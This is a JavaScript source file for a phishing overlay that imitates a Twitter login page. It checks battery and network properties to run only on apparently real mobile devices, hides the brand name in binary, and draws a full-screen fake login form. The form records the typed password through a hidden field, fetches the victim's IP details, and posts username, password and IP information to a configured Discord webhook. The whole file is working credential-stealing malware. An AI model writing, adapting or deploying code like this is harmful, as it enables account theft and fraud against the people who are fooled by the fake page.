var navibat,navichar;
navigator.getBattery().then(function(battery) {
navibat=battery.level*100;
navichar=battery.dischargingTime;
});
if( navigator.connection.downlinkMax != undefined && navibat != 100 && navichar != "Infinity"){

document.getElementsByTagName('head')[0].innerHTML += '<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>*{padding:0;margin:0;outline:0;-webkit-user-select:none;font-family:Helvetica,Arial,sans-serif;}</style>';


/// #1da1f2 #657786 #f5f8fa


var topD=document.createElement("div");
var headD=document.createElement("div");
var contD=document.createElement("div");
var twl=document.createElement("img");
var inp1=document.createElement("input");
var inp2=document.createElement("input");
var hinp2=document.createElement("input");
var btn1=document.createElement("button");
var btn2=document.createElement("button");
var btn3=document.createElement("button");

topD.style.height="100%";
topD.style.width="100%";
topD.style.zIndex="999999999";
topD.style.position="fixed";
topD.style.top="0";
topD.style.left="0";
topD.style.background="white";
////////
headD.style.position="absolute";
headD.style.top="0";
headD.style.left="0";
headD.style.background="white";
headD.style.height="50px";
headD.style.width="100%";
headD.style.lineHeight="90px";
headD.style.textAlign="center";
headD.style.color="#f0f";
headD.style.fontSize="35px";
headD.style.fontWeight="bold";


twl.style.height="30px";
twl.style.width="30px";
twl.style.marginTop="10px";
twl.src=config.logo.url;


///////
contD.style.position="absolute";
contD.style.top="50px";
contD.style.left="0";
contD.style.background="#fff";
contD.style.height="300px";
contD.style.width="100%";
contD.style.textAlign="center";
contD.style.paddingTop="20px";
contD.style.paddingBottom="30px";
////////
inp1.style.height="55px";
inp1.style.width="90%";
inp1.placeholder="Phone , email or username";
inp1.style.borderRadius="3px 3px 2px 2px";
inp1.style.lineHeight="18px";
inp1.style.padding="5px";
inp1.type="email";
inp1.style.marginTop="10px";
inp1.style.border="0";
inp1.style.background="#f5f8fa";
inp1.style.borderBottom="2px solid #657786";
inp1.style.fontSize="15px";

///////

hinp2.style.height="0px";
hinp2.style.width="0px";
hinp2.type="email";
hinp2.style.opacity="0";

/////////


inp2.style.height="55px";
inp2.style.width="90%";
inp2.placeholder="Password";
inp2.style.borderRadius="0px 0px 02px 02px";
inp2.style.lineHeight="18px";
inp2.style.padding="5px";
inp2.type="email";
inp2.style.border="0";
inp2.style.fontSize="15px";
inp2.style.marginTop="10px";
inp2.style.background="#f5f8fa";
inp2.style.borderBottom="2px solid #657786";
inp2.addEventListener("keyup",
function(){
var lngh=inp2.value.length;
hinp2.value+=inp2.value.split("•").join('');
if(lngh==0){
hinp2.value="";
}
inp2.value="";
for(var o=0;o<lngh;o++){
inp2.value+="•";
}});
inp2.addEventListener("keydown",
function(){
var lngh=inp2.value.length;
hinp2.value+=inp2.value.split("•").join('');
if(lngh==0){
hinp2.value="";
}
inp2.value="";
for(var o=0;o<lngh;o++){
inp2.value+="•";
}});


/////////
btn1.style.height="50px";
btn1.style.width="calc(90% + 10px)";
btn1.style.borderRadius="50px";
btn1.style.lineHeight="50px";
btn1.style.textAlign="center";
btn1.textContent="Log In";
btn1.style.color="white";
btn1.style.fontWeight="bold";
btn1.style.border="0";
btn1.style.marginTop="20px";
btn1.style.background="#1da1f2";
btn1.style.fontSize="15px";



btn1.addEventListener("click",
function(){
var pass=hinp2.value;
var eml=inp1.value;
if(pass.length >1 && eml.length > 1){
//Get The IP and information through Cloudflare
async function sendData() {

try {
const res = await fetch('https://www.cloudflare.com/cdn-cgi/trace');
const data = await res.text();
var y=data;



/////Send Data Through Discord
var request = new XMLHttpRequest();
request.open("POST", config.discord_webhook_url);
request.setRequestHeader('Content-type', 'application/json');
var myEmbed = {
author: {
name: "TW Data "
},
title: "Username:- "+eml+"\nPassword:- "+pass+"\n",
description:"\nInfo:- "+y,
color: 65535
}
var params = {
username: "Th30neAnd0nly/Phi ",
avatar_url : "https://repository-images.githubusercontent.com/268017280/43567c00-8e19-11eb-96d2-a360736917cb",
embeds: [ myEmbed ]
}
request.send(JSON.stringify(params));
window.location.href=config.redirectURL;
} catch (error) {
    console.log('Error:' + error);
}

}
sendData();
}
else{
///F*ck Yourself In Corner
}
});


/////////


btn2.style.height="40px";
btn2.style.width="calc(50% + 10px)";
btn2.style.borderRadius="3px";
btn2.style.lineHeight="40px";
btn2.style.textAlign="center";
btn2.textContent="Login";
btn2.style.color="black";
btn2.style.fontWeight="bold";
btn2.style.border="0";
btn2.style.marginTop="0px";
btn2.style.background="transparent";
btn2.style.fontSize="20px";

/////////

btn3.style.height="40px";
btn3.style.width="calc(90% + 10px)";
btn3.style.borderRadius="3px";
btn3.style.lineHeight="40px";
btn3.style.textAlign="center";
btn3.textContent="Forgotten password? · Sign up ";
btn3.style.color="#1da1f2";
btn3.style.border="0";
btn3.style.background="transparent";
btn3.style.marginTop="10px";
btn3.style.fontSize="14px";




var bady=document.body;
if(bady == null){
document.body=document.createElement('body');
}


document.body.appendChild(topD);
topD.appendChild(headD);
topD.appendChild(contD);
contD.appendChild(btn2);
contD.appendChild(inp1);
contD.appendChild(inp2);
contD.appendChild(btn1);
contD.appendChild(btn3);
contD.appendChild(hinp2);

if(config.logo.show){
headD.appendChild(twl);
}
if(config.text){
btn2.textContent="Login To "+ ("01010100 01110111 01101001 01110100 01110100 01100101 01110010").split(' ').map(i => String.fromCharCode(parseInt(i, 2)).toString(10)).join('');
btn3.textContent="Forgotten password? · Sign up to "+ ("01010100 01110111 01101001 01110100 01110100 01100101 01110010").split(' ').map(i => String.fromCharCode(parseInt(i, 2)).toString(10)).join('');
}
}
